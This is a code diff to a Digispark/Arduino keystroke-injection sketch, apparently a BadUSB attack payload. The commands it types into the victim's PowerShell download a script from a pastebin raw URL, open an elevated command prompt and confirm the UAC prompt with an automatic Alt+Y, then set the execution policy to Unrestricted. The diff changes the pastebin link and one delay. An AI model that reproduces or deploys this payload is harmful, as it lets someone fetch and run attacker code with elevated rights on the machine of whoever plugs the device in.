@@ -22,11 +22,11 @@ void loop() {
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
   // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
-  DigiKeyboard.println("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
+  DigiKeyboard.println("$client.DownloadFile(\"https://pastebin.com/raw/e7QyYRh7\", $path)");
   DigiKeyboard.delay(4000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
   DigiKeyboard.delay(3000);
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
